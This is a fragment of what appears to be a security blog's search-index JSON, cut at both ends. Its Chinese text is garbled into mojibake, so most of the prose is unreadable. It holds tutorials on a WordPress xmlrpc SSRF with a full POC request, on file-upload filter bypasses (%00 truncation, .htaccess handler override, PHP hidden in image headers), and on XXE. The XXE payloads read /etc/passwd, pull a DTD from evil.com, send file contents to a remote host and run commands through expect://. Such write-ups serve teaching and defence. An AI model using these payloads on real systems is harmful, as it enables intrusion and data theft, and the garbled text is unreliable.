192.168.1.2æ¢æˆ8è¿›åˆ¶0300.0250.01.02ï¼Œåœ¨å‰é¢åŠ ä¸Š0è¡¨ç¤º8è¿›åˆ¶ åå…­è¿›åˆ¶å‹ï¼šå°†IP 192.168.1.2æ¢æˆ16è¿›åˆ¶0xc0.0xA8.1.2ï¼Œåœ¨å‰é¢åŠ ä¸Š0xè¡¨ç¤º16è¿›åˆ¶ æ··åˆå‹ï¼šå³ä»¥ä¸Šçš„å‡ ç§æ–¹å¼çš„ç»“åˆï¼Œ0300.0xA8.1.0x02 ä¸‹é¢å°±æ˜¯é€šè¿‡å…«è¿›åˆ¶ç»•è¿‡æ£€æµ‹ã€‚ ä»£ç è¯¦æƒ…æ¼æ´æˆå› å¤„508 wp_http_validate_url å‡½æ•°1234567891011121314151617......if ( ! $same_host ) &#123; $host = trim( $parsed_url['host'], '.' ); if ( preg_match( '#^\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;$#', $host ) ) &#123; $ip = $host; &#125; else &#123; $ip = gethostbyname( $host ); if ( $ip === $host ) // Error condition for gethostbyname() $ip = false; &#125; if ( $ip ) &#123; $parts = array_map( 'intval', explode( '.', $ip ) ); if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0] || ( 172 === $parts[0] &amp;&amp; 16 &lt;= $parts[1] &amp;&amp; 31 &gt;= $parts[1] ) || ( 192 === $parts[0] &amp;&amp; 168 === $parts[1] ) ) &#123; ...... è¿™é‡Œçš„ä»£ç é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$åˆ¤æ–­ipæ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•åˆ™é€šè¿‡ç½‘ç»œè·å–ipçš„å€¼ã€‚ä¸‹é¢çš„ifåˆ¤æ–­åˆ™æ˜¯ç”¨æ¥é˜²æ­¢ç»™çš„urlä¸ºå†…ç½‘ipï¼Œä½†æ˜¯ä¸Šè¿°çš„æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥é€šè¿‡8è¿›åˆ¶ç»•è¿‡å†…ç½‘é™åˆ¶ã€‚123456if ( empty( $parsed_url['port'] ) ) return $url; $port = $parsed_url['port']; if ( 80 === $port || 443 === $port || 8080 === $port ) return $url; å†æ¥ä¸‹æ¥å¯ä»¥çœ‹åˆ°ç¨‹åºåˆå¯¹ç«¯å£åšäº†é™åˆ¶ï¼Œåªèƒ½æ‰«æ80,443,8080ç«¯å£ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡8è¿›åˆ¶ç»•è¿‡ipåˆ¤æ–­ï¼Œå¯ä»¥æ‰«æå†…ç½‘çš„80,443,8080æ‰¾ä¸€ä¸‹è°ƒç”¨çš„ä½ç½®,å¯ä»¥æ‰¾åˆ°class-wp-xmlrpc-server.phpé€šè¿‡wp_safe_remote_getè°ƒç”¨äº†getå‡½æ•°ï¼Œgetå‡½æ•°ä½¿ç”¨äº†wp_http_validate_urlï¼Œä»è€Œé€ æˆssrf åˆ©ç”¨åˆ©ç”¨çš„æ–¹å¼ä¸ºé€šè¿‡xmlrpc.phpä¸­pingback.pingåŠŸèƒ½æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚POC123456789101112131415161718POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 321&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; è¿™é‡Œè®¾ç½®10.10.10.111ä¸ºå—å®³è€… æ€»ç»“åœ¨æµ‹è¯•ä¸­å‘ç°åªèƒ½å¯¹10.x.x.xçš„å†…ç½‘ipè¿›è¡Œåˆ©ç”¨ï¼Œå› ä¸ºæ­£åˆ™çš„åŸå› è‡³å¤šåªèƒ½æœ‰3ä½æ•°å­—ï¼Œä¸€ä½éœ€è¦ä¸º0æ¥è¡¨ç¤º8è¿›åˆ¶ï¼Œæ‰€ä»¥åˆ©ç”¨åªæœ‰10,å¹¶ä¸”åªèƒ½æ‰«æ80,443,8080ç«¯å£ã€‚ç”±äºåˆ©ç”¨ä¸­ä¸å›æ˜¾ï¼Œä¹Ÿå¾ˆéš¾ç¡®å®šæ˜¯å¦æˆåŠŸåˆ©ç”¨ã€‚æ‰€ä»¥è¿™ä¸ªæ´å¯èƒ½å±å®³æ¯”è¾ƒå°ï¼ˆå¤ªèœäº†ï¼Œæƒ³ä¸åˆ°å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œæœ‰å…¶ä»–çš„åˆ©ç”¨æ–¹å¼è®°å¾—åˆ†äº«å•Šï¼ï¼ï¼ï¼‰è¿˜æœ‰ä¸€ç§åˆ©ç”¨å°±æ˜¯å¼€å¯xmlrpcçš„wordpressç«™å¯ä»¥è¢«é€šè¿‡pingback.pingæ–¹æ³•æ¥DDOSï¼Œè¿™ä¸ªä»¥å‰å°±æœ‰äººæå‡ºæ¥äº†ã€‚ å‚è€ƒhttp://xlab.baidu.com/wordpress/https://virusdefender.net/index.php/archives/733/"},{"title":"ã€VULNERABLITYã€‘æ–‡ä»¶ä¸Šä¼ å­¦ä¹ æ€»ç»“","permalink":"http://blog.0kami.cn/2016/07/04/old-file-upload/","text":"æ¦‚è¿°è¿™å‡ å¤©ç©ºä¸‹æ¥æ ¹æ®ä¸Šä¼ æ”»å‡»æ¡†æ¶å­¦ä¹ æ€»ç»“ä¸€ä¸‹ä¸Šä¼ æ”»å‡»ã€‚ ä¸Šä¼ æ£€æµ‹æµç¨‹ å®¢æˆ·ç«¯javascriptæ£€æµ‹ï¼ˆæ£€æµ‹æ–‡ä»¶æ‰©å±•åä¸ºä¸»ï¼‰ æœåŠ¡ç«¯MIMEç±»å‹æ£€æµ‹ï¼ˆæ£€æµ‹Content-typeå†…å®¹ï¼‰ æœåŠ¡ç«¯ç›®å½•è·¯åŠ²æ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿpathç›¸å…³çš„å†…å®¹ï¼‰ æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼ˆæ£€æµ‹è·Ÿæ–‡ä»¶åç¼€ç›¸å…³çš„å†…å®¹ï¼‰ æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹ï¼ˆæ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ï¼‰ å®¢æˆ·ç«¯javascriptæ£€æµ‹é€šå¸¸æ­¤ç±»æ£€æµ‹ä¼šåœ¨jsæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªæ£€æµ‹çš„å‡½æ•°ï¼Œä¸€èˆ¬å¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååšæ£€æµ‹ï¼Œä¾‹å¦‚ä»…å…è®¸ä¸Šä¼ png,jpg,gifç­‰ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚æœæ£€æµ‹åˆ°çš„æ–‡ä»¶åç¼€åä¸æ˜¯åœ¨è¿™äº›åå•å†…ï¼Œåˆ™ä¸å‘æœåŠ¡å™¨ç«¯ä¼ è¾“æ–‡ä»¶å†…å®¹ã€‚è¿™ç±»æ£€æµ‹ä¹Ÿæ˜¯æœ€å®¹æ˜“ç»•è¿‡çš„æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨firebugä¹‹ç±»çš„æ’ä»¶æŠŠå®ƒç¦æ‰æˆ–è€…é€šè¿‡burpä¹‹ç±»çš„ä»£ç†å·¥å…·è¿›è¡Œç»•è¿‡æäº¤ã€‚ä½¿ç”¨burpï¼Œä¸Šä¼ æ—¶æä¾›ä¸€ä¸ªç™½åå•å†…çš„åç¼€ï¼Œé€šè¿‡burpæ‹¦åŒ…ï¼Œå¹¶ä¿®æ”¹åç¼€åæäº¤ æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆMIMEç±»å‹æ£€æµ‹ï¼‰12345678910111213&lt;?php if($_FILES['userfile']['type'] != \"image/gif\") &#123; //æ£€æµ‹Content-type echo \"Sorry, we only allow uploading GIF images\"; exit; &#125; $uploaddir = 'uploads/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\"; &#125; else &#123; echo \"File uploading failed.\\n\"; &#125;?&gt; ä¸Šé¢ä¸ºphpåç«¯æ£€æµ‹MIMEç±»å‹çš„ä¸€ä¸ªä¾‹å­é€šè¿‡åˆ¤æ–­$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;æ¥ä¿è¯ä¸Šä¼ çš„ç±»å‹ä¸ºgifç±»å‹çš„æ–‡ä»¶ã€‚ç»•è¿‡è¿™ä¸€ç±»å‹çš„æ£€æµ‹ï¼Œå¯ä»¥é€šè¿‡burpæ‹¦åŒ…ï¼Œå°†åŸContent-Typeç±»å‹è¯¥ä¸ºç¬¦åˆè¦æ±‚çš„image/gifç±»å‹ã€‚ æœåŠ¡ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆç›®å½•è·¯åŠ²æ£€æµ‹ï¼‰æœ‰ä¸€äº›webåº”ç”¨ç¨‹åºæœ‰å¤šä¸ªæ–‡ä»¶å¤¹ç”¨æ¥å­˜å‚¨å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ºäº†æ ‡è¯†ä¸Šä¼ çš„å›¾ç‰‡æ˜¯å±äºå“ªä¸ªæ–‡ä»¶å¤¹çš„ï¼Œä¸Šä¼ æ–‡ä»¶æ—¶ä¼šå¸¦ä¸Šæ–‡ä»¶å­˜å‚¨è·¯åŠ²ã€‚è€Œæ­¤æ—¶å¦‚æœå¯¹æ–‡ä»¶ç›®å½•è·¯åŠ²æ£€æµ‹ä¸å¤Ÿå®Œå…¨ï¼Œå¯ä»¥é€šè¿‡æˆªæ–­æ”»å‡»ã€‚ï¼ˆå¦‚%00,windowsä¸‹%80-%90ï¼‰å¦‚ä¸Šä¼ æ—¶æä¾›å­˜å‚¨è·¯åŠ²ä¸ºimage/20160704/å¯ä»¥é€šè¿‡ä¿®æ”¹ä¸ºimage/20160704/evil.php%00æ¥è¾¾åˆ°æˆªæ–­ç›®çš„ã€‚åç«¯ç¨‹åºä¼šå°†è¯¥è·¯åŠ²è¿æ¥ä¸ºimage/20160704/evil.php%00filename.gif00æˆªæ–­å¯¼è‡´æœ€ç»ˆå­˜å‚¨çš„æ–‡ä»¶åä¸ºevil.php æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰ é»‘åå•æ£€æµ‹é»‘åå•æ£€æµ‹é€šå¸¸ä¼šæœ‰ä¸€ä¸ªæ–‡ä»¶åç¼€åé»‘åå•ï¼ˆä¾‹å¦‚html|htm|php|php2|php3|php4|php5â€¦ï¼‰ä½†æ˜¯é€šå¸¸é»‘åå•æ£€æµ‹ä¸èƒ½åŒ…å«æ‰€æœ‰çš„æ¶æ„è„šæœ¬åç¼€ï¼Œé˜²æŠ¤éš¾åº¦ä¼šæ¯”è¾ƒå¤§ï¼Œæ¨èä½¿ç”¨ç™½åå•ç»•è¿‡çš„æ–¹æ³•ï¼š æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼ˆä¾‹å¦‚ç”¨Phpï¼ŒAspç­‰ï¼‰ åå•åˆ—è¡¨ç»•è¿‡(ç”¨é»‘åå•ä¸­æœªæåŠçš„æ–‡ä»¶åç¼€æ¥ç»•è¿‡ï¼Œå¦‚asaï¼Œcerç­‰ä¸å¸¸è§çš„æ–‡ä»¶åç¼€) 0x00æˆªæ–­ï¼ˆaspä¸‹å¯ä»¥å°è¯•ä½¿ç”¨,aspä¸ºä»åå¾€å‰æ‰«ææ‰©å±•åï¼Œevil.asp%00.jpgï¼Œä¼šè¢«è¯†åˆ«ä¸ºjpgï¼Œåªè¦æ£€æµ‹æ–¹å¼å¦‚è¿™ç§å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ï¼‰ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼ˆåªé€‚ç”¨windowsï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºevil.php.æˆ–evil.php (æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼),åœ¨windowsä¸‹ï¼Œä¸å…è®¸è¿™æ ·çš„å‘½åï¼Œæ‰€ä»¥ä¼šå°†.å’Œç©ºæ ¼è‡ªåŠ¨å»æ‰ï¼‰ .htaccessæ–‡ä»¶æ”»å‡»ï¼ˆé…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessï¼Œå°±å¯ä»¥è½»æ¾ç»•è¿‡å„ç§æ£€æµ‹ï¼‰ .htaccessæ–‡ä»¶æ”»å‡»å¦‚æœé»‘åå•ä¸­æœªåŒ…å«.htaccessåç¼€çš„å¯ä»¥é€šè¿‡é‡å†™è§£æé…ç½®æ¥è¾¾åˆ°è§£æçš„æ•ˆæœé’ˆå¯¹phpï¼Œä¸Šä¼ è‡ªå®šä¹‰.htaccess123&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; åŒç›®å½•æœ‰ä¸ªæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåªæœ‰æ–‡ä»¶åå¹¶åŒ…å«å­—ç¬¦ä¸²â€hahaâ€ï¼Œä½†æ˜¯å´æ— ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ php ä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡èœåˆ€è¿æ¥å¯ä»¥è§£æphpæˆå› ï¼š åœ¨ PHP manual ä¸­æåˆ°äº†ä¸‹é¢ä¸€æ®µè¯ move_uploaded_file section, there is a warning which states â€˜If the destination file already exists, it will be overwritten.â€™ å¦‚æœ PHP å®‰å…¨æ²¡é…ç½®å¥½ å°±å¯ä»¥é€šè¿‡ move_uploaded_file å‡½æ•°æŠŠè‡ªå·±å†™çš„.htaccess æ–‡ä»¶è¦†ç›–æ‰æœåŠ¡å™¨ä¸Šçš„ è¿™æ ·å°±èƒ½ä»»æ„å®šä¹‰è§£æåå•äº† è§£ææ¼æ´ï¼ˆapacheè§£ææ¼æ´ï¼Œiis6.0è§£ææ¼æ´ï¼Œnginxè§£ææ¼æ´ï¼‰ apacheè§£ææ¼æ´apacheæ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æï¼Œå¦‚æœæœ€å³çš„åç¼€æ— æ³•è§£æï¼Œåˆ™å°è¯•è§£æåä¸€ä¸ªåç¼€ iis6.0è§£ææ¼æ´ æˆå› ä¸ºiis6.0ä¸è§£æ;åé¢çš„ï¼Œæ‰€ä»¥æäº¤evil.asp;.htmlè§£æä¸ºaspç±»å‹ è¿˜æœ‰ä¸€ä¸ªä¸ºIIS6.0çš„00æˆªæ–­æ”»å‡» IIS6.0åŒæ–‡ä»¶ä¸Šä¼  æ–‡ä»¶å¤¹çš„åå­—åŒ…å«.aspåˆ™è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶éƒ½ä»¥aspçš„å½¢å¼æ¥è§£æ iis7.0/7.5è§£ææ¼æ´å¯¹äºphpæœ‰ä¸€ä¸ªç±»ä¼¼Nginxçš„è§£ææ¼æ´evil.jpg/evil.php è§£æevil.jpgä¸­çš„phpä»£ç ï¼Œè¿™ä¸ªæ¼æ´æˆå› åœ¨äºphp-cgiçš„æ¼æ´ nginxè§£ææ¼æ´ å°†phpæ–‡ä»¶æ¢æˆå…¶ä»–å¯ä»¥é€šè¿‡çš„æ–‡ä»¶åç¼€ï¼Œè®¿é—®çš„æ—¶å€™åœ¨åé¢åŠ ä¸Š/.phpï¼Œå³evil.jpg/.phpï¼Œevil.jpgä¼šè§£æä¸ºphpçš„æ ¼å¼ %00æˆªæ–­ å…¶ä»–æ–¹å¼æäº¤å‰å°†filename=â€evil.phpâ€è¯¥ä¸ºâ€evil.phpâ€.jpgâ€ ç™½åå•æ£€æµ‹ 0x00æˆªæ–­ç»•è¿‡ è§£ææ¼æ´ç»•è¿‡ï¼ˆæ–‡ä»¶åä¸è¢«é‡å†™ï¼‰ æœåŠ¡å™¨ç«¯æ£€æµ‹ç»•è¿‡ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰å›¾åƒç±»çš„æ–‡ä»¶å†…å®¹æ£€æµ‹ æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆå›¾ç‰‡å¤´æ ¼å¼æ£€æµ‹ï¼‰jpgå†…å®¹å¤´value= FF D8 FF E0 00 10 4A 46 49 46gifå†…å®¹å¤´value= 47 49 46 38 39 61pngå†…å®¹å¤´value= 89 50 4E 47 åœ¨æ–‡ä»¶å¤´ååŠ ä¸Šä¸€å¥è¯æœ¨é©¬å°±èƒ½ç»•è¿‡ æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ å›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹å¸¸ç”¨çš„å°±æ˜¯phpçš„getimagesize()å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„æ³¨é‡ŠåŒºï¼ˆdataåŒºï¼‰æ’å…¥ä¸€å¥è¯ä»£ç ï¼Œå¦‚ä¸‹ï¼š1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) æ–‡ä»¶åŠ è½½æ£€æµ‹ è°ƒç”¨APIæˆ–å‡½æ•°å»è¿›è¡Œæ–‡ä»¶åŠ è½½æµ‹è¯•ï¼Œå¸¸è§çš„æ˜¯å›¾åƒæ¸²æŸ“æµ‹è¯•ï¼ŒäºŒæ¬¡æ¸²æŸ“ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œå†ä¸‹è½½ä¸‹æ¥ï¼Œdiffä¸€ä¸‹æ‰¾åˆ°ä¸å˜çš„ä½ç½®æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æˆåŠŸç‡ä¸é«˜ æ€»ç»“è½»é‡çº§æ£€æµ‹ç»•è¿‡æ”»å‡» ç»•è¿‡ javascript å¯¹æ‰©å±•åçš„æ£€æµ‹ &lt;ç”¨ burp ä¹‹ç±»çš„åå‘ä»£ç†å·¥å…·ç›´æ¥ POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡å‰ç«¯æ£€æµ‹&gt; ç»•è¿‡æœåŠ¡ç«¯å¯¹ http request åŒ… MIME ç±»å‹æ£€æµ‹ &lt;ç”¨ burp ä¹‹ç±»çš„åå‘ä»£ç†å·¥å…·ä¼ªé€  POST æ•°æ®åŒ…åˆ°æœåŠ¡ç«¯ï¼Œç»•è¿‡ MIME æ£€æµ‹&gt; è·¯å¾„/æ‰©å±•åæ£€æµ‹ç»•è¿‡æ”»å‡» é»‘åå•ç»•è¿‡ æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ åå•åˆ—è¡¨ç»•è¿‡ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ 0x00 æˆªæ–­ç»•è¿‡ .htaccess æ–‡ä»¶æ”»å‡» æœ¬åœ°åŒ…å«æ¼æ´ Apache è§£ææ¼æ´ IIS è§£ææ¼æ´ Nginx è§£ææ¼æ´ ç™½åå•ç»•è¿‡ 0x00 æˆªæ–­ç»•è¿‡ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ IIS è§£ææ¼æ´ Nginx è§£ææ¼æ´ æ–‡ä»¶å†…å®¹æ£€æµ‹ç»•è¿‡æ”»å‡» æ–‡ä»¶åŠ è½½æµ‹è¯•ç»•è¿‡&lt;å¯¹æ–‡ä»¶è¿›è¡Œä»£ç æ³¨å…¥å†é…åˆä»»æ„è§£æè°ƒç”¨/æ¼æ´&gt;"},{"title":"ã€VULNERABLITYã€‘XML External Entity(XXE)","permalink":"http://blog.0kami.cn/2016/06/28/old-xxe/","text":"æè¿°XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ªsecurity.tencent.comXMLä¾‹å­1234567891011121314&lt;?xml version=\"1.0\" ?&gt; xmlå£°æ˜&lt;!DOCTYPE note[ æ–‡æ¡£ç±»å‹å®šä¹‰ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; æ–‡æ¡£å…ƒç´ &lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Test&lt;/heading&gt;&lt;body&gt;This is a Test&lt;/body&gt;&lt;/note&gt; ä¸Šè¿°ä¸ºä¸€ä¸ªXMLçš„å®ä¾‹DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚ å†…éƒ¨å£°æ˜DTD&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt; å¼•ç”¨å¤–éƒ¨DTD&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;æˆ–è€…&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;public_ID&quot; &quot;æ–‡ä»¶å&quot;&gt;DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚ å†…éƒ¨å£°æ˜å®ä½“&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; å¼•ç”¨å¤–éƒ¨å®ä½“&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;æˆ–è€…&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; æ¼æ´æè¿°æ‘˜è‡ªOWASP1An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. æ¼æ´æˆå› ä¸ºXMLè§£æå™¨é…ç½®ä¸å®‰å…¨æ—¶ï¼Œå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚ è¯•éªŒæ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“æ–¹å¼ï¼š æœ¬åœ°æ–‡ä»¶è¯»å– 12345&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; è¿œç¨‹æ–‡ä»¶è¯»å– 12345678&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % d SYSTEM \"http://evil.com/evil.dtd\"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;å…¶ä¸­evil.dtdæ–‡ä»¶å†…å®¹&lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt; ä½†æ˜¯å¦‚æœé‡åˆ°è¯»å–å¤šè¡Œçš„æ–‡ä»¶ï¼Œå¯èƒ½ä¼šè¯»ä¸å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹ftpæ¥å—xxeæ•°æ®ä¸åŒçš„è¯­è¨€é»˜è®¤æ”¯æŒçš„åè®®ä¸åŒ libxml2 php java .net filehttpftp filehttpftpphpcompress.zipcompress.bzip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * httpfilehttpsftp ä¸Šè¿°ä¸ºé»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥é€šè¿‡æ‰©å±•æ”¯æŒå…¶ä»–åè®®ï¼Œå¦‚php scheme extension required httpsftps openssl zip zip ssh2.shellssh2.execssh2.tunnelssh2.sftpssh2.scp ssh2 rar rar ogg oggvorbis expect expect demo1 ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; demo2 ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®1234567891011121314$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/issue\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; %send;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);è¿œç¨‹DTDæ–‡ä»¶å†…å®¹&lt;!ENTITY % all \"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;\"&gt;%all; demo3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"expect://id\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; æ‰§è¡ŒæˆåŠŸéœ€è¦phpçš„expectæ‰©å±• demo4 æ¢æµ‹å†…ç½‘åº”ç”¨123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"http://192.168.1.20:80\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; å¦‚æœä¸å­˜åœ¨è¯¥ipçš„åº”ç”¨ï¼Œä¼šæœ‰warning failed to open streamï¼Œé€šè¿‡è¿™ç§æ–¹å¼æ¢æµ‹å†…å®¹åº”ç”¨åŒæ—¶å¦‚æœæ‰¾åˆ°äº†å†…å®¹åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ”»å‡»å†…ç½‘åº”ç”¨ é˜²å¾¡æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³• PHPï¼šlibxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Pythonï¼šfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLICã€‚ jsonèŠ‚ç‚¹çš„Content-Type XXEæ”»å‡»å¦‚ä»Šå¾ˆå¤šwebåº”ç”¨ç¨‹åºä½¿ç”¨çš„éƒ½æ˜¯jsonæ ¼å¼çš„æ•°æ®ä¼ é€’ï¼Œé€šè¿‡åœ¨http requestå¤´ä¸­å¸¦å…¥Content-Type: application/jsonè¡¨æ˜ä¼ é€’çš„æ˜¯jsonæ 